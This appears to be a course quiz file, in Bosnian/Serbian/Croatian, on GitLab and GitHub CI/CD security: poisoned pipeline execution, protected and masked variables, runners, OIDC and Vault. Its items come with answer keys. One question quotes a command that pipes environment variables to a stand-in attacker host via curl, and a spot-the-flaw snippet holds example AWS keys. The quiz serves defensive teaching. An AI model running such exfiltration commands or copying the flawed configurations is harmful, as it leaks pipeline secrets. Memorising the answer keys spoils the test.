@@ -1,0 +1,250 @@
+[
+  {
+    "obj": "1.3",
+    "q": "Developer u svojoj feature grani doda u .gitlab-ci.yml liniju „env | curl -d @- https://napadac.example“ i pushne. Pipeline se pokrene i pošalje varijable. Kako se zove ovaj napad i koja kontrola bi spriječila krađu produkcijskih tajni?",
+    "options": [
+      "Dependency confusion; privatni PyPI mirror",
+      "Direct PPE; produkcijske tajne kao protected varijable, dostupne samo protected granama",
+      "Indirect PPE; masked varijable",
+      "Public PPE; CODEOWNERS za Makefile"
+    ],
+    "answer": 1,
+    "explain": "Izmjena samog CI fajla u grani je direktni PPE. Protected varijable feature grana uopšte ne dobija. Masking ne pomaže jer zlonamjeran kod može kodirati vrijednost, dependency confusion je drugi rizik (CICD-SEC-3), a napad nije došao iz forka."
+  },
+  {
+    "obj": "1.3",
+    "q": ".gitlab-ci.yml je zaštićen preko CODEOWNERS i niko van platform tima ga ne može promijeniti. Ipak, napadač sa Developer ulogom ukrade tajne test joba. Job radi samo „pip install -r requirements.txt && pytest“. Šta je najvjerovatnije izmijenio?",
+    "options": [
+      "tests/conftest.py ili neki drugi fajl koji pytest izvršava",
+      ".gitlab-ci-local-variables.yml",
+      "README.md",
+      "Protected branch postavke projekta"
+    ],
+    "answer": 0,
+    "explain": "To je indirektni PPE: CI fajl je zaštićen, ali job izvršava kod iz repoa (conftest.py, setup.py, Makefile). README se ne izvršava, lokalni fajl sa varijablama nije dio GitLab pipelinea, a Developer ne može mijenjati postavke zaštite grana."
+  },
+  {
+    "obj": "1.3",
+    "type": "match",
+    "q": "Upari nalaz iz revizije GitLab instance sa rizikom iz OWASP Top 10 CI/CD.",
+    "options": [
+      "Statički AWS ključ u varijabli projekta, napravljen prije 3 godine",
+      "Developer može pushati direktno na main i time pokrenuti deploy u produkciju",
+      "Deploy job povlači sliku po tagu bez provjere potpisa",
+      "Niko ne prati audit događaje o izmjenama varijabli i runnera"
+    ],
+    "targets": [
+      "CICD-SEC-10 Insufficient Logging and Visibility",
+      "CICD-SEC-6 Insufficient Credential Hygiene",
+      "CICD-SEC-3 Dependency Chain Abuse",
+      "CICD-SEC-1 Insufficient Flow Control Mechanisms",
+      "CICD-SEC-9 Improper Artifact Integrity Validation"
+    ],
+    "answer": [
+      1,
+      3,
+      4,
+      0
+    ],
+    "explain": "Dugovječan statički ključ je loša higijena kredencijala (6), push na main bez reviewa je slaba kontrola toka (1), slika bez provjere potpisa je problem integriteta artefakta (9), a nepraćen audit log je nedostatak vidljivosti (10). Dependency Chain Abuse je distraktor."
+  },
+  {
+    "obj": "1.3",
+    "q": "Na self-managed runneru je config.toml sa executor = \"docker\" i volumes = [\"/var/run/docker.sock:/var/run/docker.sock\", \"/cache\"]. Zašto je to rizično?",
+    "options": [
+      "Keš u /cache se ne briše između jobova",
+      "Docker socket usporava pull slika",
+      "Svaki job može preko Docker socketa pokrenuti privilegovan kontejner i preuzeti host runnera",
+      "Docker executor ne podržava id_tokens kada je socket montiran"
+    ],
+    "answer": 2,
+    "explain": "Pristup Docker socketu je praktično root na hostu: job može pokrenuti kontejner sa montiranim / i privileged modom, pa doći do tajni drugih jobova. Za build slika koristi BuildKit rootless, Kaniko ili Buildah. Ostale tvrdnje nisu tačne ili nisu sigurnosni problem tog reda."
+  },
+  {
+    "obj": "1.3",
+    "q": "Deploy u produkciju ide na runner sa tagom prod-deploy. Bilo koji developer može u feature grani napisati tags: [prod-deploy]. Šta osigurava da se job iz feature grane ne izvrši na tom runneru?",
+    "options": [
+      "Tag runnera koji počinje sa prod-",
+      "Runner je označen kao protected, pa izvršava samo jobove sa protected grana i tagova",
+      "rules: if: $CI_COMMIT_BRANCH == \"main\" u deploy jobu",
+      "allowed_images u config.toml"
+    ],
+    "answer": 1,
+    "explain": "Protected runner prihvata samo jobove iz pipelinea na protected granama/tagovima, a to napadač ne može promijeniti iz svoje grane. Tag i rules su u CI fajlu koji napadač kontroliše u svojoj grani, a allowed_images ograničava slike, ne izvor joba."
+  },
+  {
+    "obj": "1.3",
+    "q": "Javni projekat prima MR-ove iz forkova. Maintainer želi pokrenuti pipeline u parent projektu za MR iz forka jer testovi trebaju parent runnere. Šta mora uraditi PRIJE pokretanja?",
+    "options": [
+      "Pročitati diff, posebno CI fajlove i skripte koje pipeline izvršava, jer će taj kod dobiti pristup varijablama parent projekta",
+      "Ništa: pipelinei za forkove nikad ne vide varijable parent projekta",
+      "Isključiti masking varijabli da bi logovi bili čitljivi",
+      "Dodati allow_failure: true na sve jobove"
+    ],
+    "answer": 0,
+    "explain": "Kad se pipeline za fork MR pokrene u parent projektu, kod iz forka radi sa okruženjem parent projekta; to je put za javni PPE. Podrazumijevano fork pipeline radi u forku bez parent varijabli, ali ova opcija to mijenja. Masking i allow_failure nisu relevantni."
+  },
+  {
+    "obj": "1.3",
+    "q": "Svi projekti uključuju sigurnosne jobove ovako:\ninclude:\n  - project: shop/ci-templates\n    file: /templates/security.yml\nŠta je problem?",
+    "options": [
+      "include ne podržava ključ project, samo local",
+      "Fajl mora imati ekstenziju .gitlab-ci.yml",
+      "Nedostaje stage: security",
+      "Bez ref se uključuje podrazumijevana grana šablona, pa svaka izmjena u njoj odmah utiče na sve pipelinee; treba pinovati ref na tag ili SHA"
+    ],
+    "answer": 3,
+    "explain": "Bez ref GitLab uzima HEAD podrazumijevane grane projekta šablona. Kompromitovan ili pogrešan commit u šablonu odmah se izvršava u svim projektima. include:project je validna sintaksa, ime fajla je proizvoljno, a stage se definiše u samim jobovima."
+  },
+  {
+    "obj": "1.3",
+    "q": "U GitHub Actions workflowu postoji on: pull_request_target i korak actions/checkout sa ref: ${{ github.event.pull_request.head.sha }}, pa make test. Zašto je ovo opasno?",
+    "options": [
+      "pull_request_target ne podržava checkout",
+      "Kod iz forka se izvršava u kontekstu base repoa, sa tajnama i tokenom sa pravom pisanja",
+      "head.sha nije stabilna referenca",
+      "make nije dostupan na ubuntu-latest runnerima"
+    ],
+    "answer": 1,
+    "explain": "pull_request_target radi sa tajnama i GITHUB_TOKEN-om base repoa, a ovdje se eksplicitno checkoutuje i izvršava nepregledan kod iz forka: javni PPE. Za testiranje koda iz forka koristi pull_request. Ostale tvrdnje su netačne."
+  },
+  {
+    "obj": "1.4",
+    "q": "Stari deploy job pada sa greškom autentifikacije prema Vaultu nakon nadogradnje GitLaba na 17.x. U jobu stoji: vault write auth/jwt/login role=deploy jwt=$CI_JOB_JWT_V2. Šta je uzrok i ispravka?",
+    "options": [
+      "Vault rola je istekla; produžiti token_max_ttl",
+      "JWT auth metoda je uklonjena iz Vaulta 2.x; preći na AppRole",
+      "CI_JOB_JWT_V2 je uklonjen u GitLabu 17.0; definisati id_tokens sa aud koji odgovara bound_audiences role i koristiti tu varijablu",
+      "Varijabla mora biti protected; označiti CI_JOB_JWT_V2 kao protected"
+    ],
+    "answer": 2,
+    "explain": "CI_JOB_JWT i CI_JOB_JWT_V2 su uklonjeni u GitLabu 17.0; zamjena je id_tokens sa eksplicitnim aud. JWT auth metoda i dalje postoji u Vaultu, a predefinisane varijable se ne mogu označiti kao protected."
+  },
+  {
+    "obj": "1.4",
+    "q": "AWS trust policy za GitLab OIDC rolu ima samo uslov StringEquals na gitlab.kurs-shop.ba:aud. Šta je rizik?",
+    "options": [
+      "Bilo koji projekat i grana na toj GitLab instanci može preuzeti rolu, jer nema provjere sub claima",
+      "Rola se ne može preuzeti jer aud mora biti sts.amazonaws.com",
+      "Token će isteći prije nego Terraform završi",
+      "CloudTrail neće bilježiti AssumeRoleWithWebIdentity"
+    ],
+    "answer": 0,
+    "explain": "aud samo kaže kome je token namijenjen; svaki job na instanci može zatražiti token sa tim aud. Bez uslova na sub (projekat, grana) rolu preuzima bilo ko sa pristupom instanci. aud je proizvoljna vrijednost koju dogovoriš sa providerom, a CloudTrail bilježi poziv bez obzira na uslove."
+  },
+  {
+    "obj": "1.4",
+    "q": "Želiš da Vault rola izdaje produkcijske tajne samo jobovima projekta shop/kurs-shop koji rade na protected granama. Koji bound_claims su ispravni?",
+    "options": [
+      "{\"namespace_path\": \"shop\"}",
+      "{\"project_path\": \"shop/kurs-shop\", \"pipeline_source\": \"merge_request_event\"}",
+      "{\"user_login\": \"andrija\"}",
+      "{\"project_path\": \"shop/kurs-shop\", \"ref_protected\": \"true\"}"
+    ],
+    "answer": 3,
+    "explain": "project_path veže rolu za projekat, a ref_protected: \"true\" za protected grane i tagove, što blokira D-PPE iz feature grana. namespace_path dozvoljava sve projekte u grupi, merge_request_event bi dozvolio upravo nepregledan kod, a user_login veže za osobu, ne za kontekst pipelinea."
+  },
+  {
+    "obj": "1.4",
+    "q": "Tim je sve tajne označio kao Masked i smatra da su sigurne od PPE napada. Šta im odgovaraš?",
+    "options": [
+      "Tačno je; masked varijable se nikad ne mogu izvući iz joba",
+      "Masking samo zamjenjuje tačnu vrijednost u logu; zlonamjeran job je može kodirati ili poslati na mrežu. Protiv PPE treba Protected (i environment scope ili Vault sa ref_protected)",
+      "Treba ih označiti kao Masked and hidden, pa ih job neće moći pročitati",
+      "Treba ih prebaciti u .gitlab-ci.yml pod variables: jer tamo nisu dostupne feature granama"
+    ],
+    "answer": 1,
+    "explain": "Masking štiti od slučajnog ispisa, ne od koda koji namjerno krade vrijednost. Hidden samo sakriva vrijednost u UI-ju, a job je i dalje dobija. Vrijednosti u .gitlab-ci.yml su u repou i vidljive svima: najgora opcija."
+  },
+  {
+    "obj": "1.4",
+    "q": "Deploy job ima:\nid_tokens:\n  VAULT_ID_TOKEN:\n    aud: https://vault.kurs-shop.ba\nsecrets:\n  DB_PASSWORD:\n    vault: kurs-shop/prod/db/password@secret\n    token: $VAULT_ID_TOKEN\nSkripta radi cat \"$DB_PASSWORD\" i ispisuje lozinku, a mysql klijent dobija putanju umjesto lozinke. Zašto?",
+    "options": [
+      "secrets:vault podrazumijevano upisuje vrijednost u privremeni fajl, a varijabla sadrži putanju; za vrijednost direktno u varijabli dodaj file: false",
+      "Putanja mora biti secret/data/kurs-shop/prod/db",
+      "aud mora biti jednak VAULT_SERVER_URL bez https://",
+      "token: se ne smije navoditi kada postoji samo jedan ID token"
+    ],
+    "answer": 0,
+    "explain": "secrets podrazumijevano daju file-type varijablu (putanja do fajla sa vrijednošću); file: false stavlja vrijednost direktno u varijablu. Format putanja/polje@mount je ispravan, aud je proizvoljna vrijednost koja mora odgovarati bound_audiences, a token: je dozvoljen."
+  },
+  {
+    "obj": "1.4",
+    "q": "terraform plan u MR pipelineu i terraform apply na main koriste istu AWS rolu sa AdministratorAccess. Koje je najbolje poboljšanje po principu najmanjih privilegija?",
+    "options": [
+      "Dodati allow_failure: true na plan job",
+      "Staviti AWS ključeve u masked varijablu umjesto OIDC-a",
+      "Dvije role: read-only rola za plan (dozvoljene i MR grane) i rola sa pravom izmjene samo za main/protected okruženje, odvojene uslovima na sub",
+      "Pokretati plan i apply u istom jobu da token traje kraće"
+    ],
+    "answer": 2,
+    "explain": "Plan treba samo čitanje, a MR kod je manje povjerljiv; apply sa pravima izmjene treba biti vezan za main i zaštićeno okruženje. Statički ključevi su korak unazad, allow_failure ne smanjuje prava, a spajanje jobova bi davalo pravo izmjene i MR kodu."
+  },
+  {
+    "obj": "1.4",
+    "type": "order",
+    "q": "Poredaj korake migracije deploy joba sa statičkog AWS ključa na GitLab OIDC bez prekida rada.",
+    "options": [
+      "Obrisati stari access key i CI varijable sa ključem",
+      "Napraviti IAM OIDC provider i rolu sa trust policyjem koji provjerava aud i sub",
+      "Provjeriti u IAM-u (LastUsedDate) i CloudTrailu da se stari ključ više ne koristi",
+      "Dodati id_tokens i assume-role-with-web-identity u job i pustiti ga da radi preko nove role"
+    ],
+    "answer": [
+      1,
+      3,
+      2,
+      0
+    ],
+    "explain": "Prvo provider i rola, zatim job koji je koristi, pa potvrda da stari ključ više niko ne koristi, i tek onda brisanje ključa. Brisanje prije provjere rizikuje prekid nekog zaboravljenog joba."
+  },
+  {
+    "obj": "1.4",
+    "q": "Test job i deploy job vide istu varijablu PROD_DB_PASSWORD (protected). Test job radi na main nakon merga, pa takođe dobija produkcijsku lozinku. Koja GitLab postavka najdirektnije ograničava varijablu samo na deploy?",
+    "options": [
+      "Masked and hidden",
+      "Minimum role to use pipeline variables postavljen na no_one_allowed",
+      "Expand variable reference isključen",
+      "Environment scope varijable postavljen na production, uz environment: production u deploy jobu"
+    ],
+    "answer": 3,
+    "explain": "Environment scope daje varijablu samo jobovima sa odgovarajućim environment, pa test job na main je ne dobija (CICD-SEC-5). Hidden i expand utiču na prikaz i interpolaciju, a minimum role ograničava ko smije zadavati pipeline varijable."
+  },
+  {
+    "obj": "1.4",
+    "type": "match",
+    "q": "Upari GitLab mehanizam sa prijetnjom od koje prvenstveno štiti.",
+    "options": [
+      "Protected variable",
+      "Masked variable",
+      "Protected environment sa obaveznim approvalom",
+      "id_tokens sa posebnim aud za svaki cilj"
+    ],
+    "targets": [
+      "Deploy u produkciju bez odobrenja druge osobe",
+      "Token namijenjen Vaultu prihvaćen u drugom servisu",
+      "Slučajan ispis tajne u logu joba",
+      "Job iz feature grane dobija produkcijsku tajnu"
+    ],
+    "answer": [
+      3,
+      2,
+      0,
+      1
+    ],
+    "explain": "Protected varijabla nije dostupna neprotected granama, masking skriva tačnu vrijednost u logu, protected environment traži dozvolu za deploy, a različiti aud sprječavaju da se token upotrijebi kod pogrešnog primaoca."
+  },
+  {
+    "type": "spot",
+    "obj": "1.4",
+    "q": "Ovaj .gitlab-ci.yml deployuje kurs-shop u produkciju. Označi redove koji krše principe identiteta pipelinea: kakvi su kredencijali i kada deploy smije da se pokrene.",
+    "snippet": "variables:\n  AWS_ACCESS_KEY_ID: AKIA4EXAMPLE7QXZ2LMN\n  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n\nunit-tests:\n  stage: test\n  image: node:20.11-alpine\n  script: [npm ci, npm test]\n\ndeploy-prod:\n  stage: deploy\n  image: amazon/aws-cli:2.15.0\n  script:\n    - aws s3 sync dist/ s3://kurs-shop-prod --delete\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"",
+    "lang": "yaml",
+    "answer": [
+      1,
+      2,
+      15
+    ],
+    "explain": "Statični AWS ključevi u .gitlab-ci.yml su u gitu: vidi ih svako ko čita repo i ostaju u istoriji, a kao globalne varijable dobija ih i svaki job, uključujući unit-tests koji izvršava kod iz MR-a. Ispravka: opozovi i rotiraj ključeve, a deploy job neka koristi id_tokens (aud prema AWS-u) i AssumeRoleWithWebIdentity na rolu čiji trust dozvoljava samo zaštićenu granu. Pravilo merge_request_event pokreće produkcijski deploy nad neprovjerenim kodom iz MR-a (poisoned pipeline execution); deploy treba da ide samo sa zaštićene grane, npr. if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH, uz zaštićeno okruženje."
+  }
+]
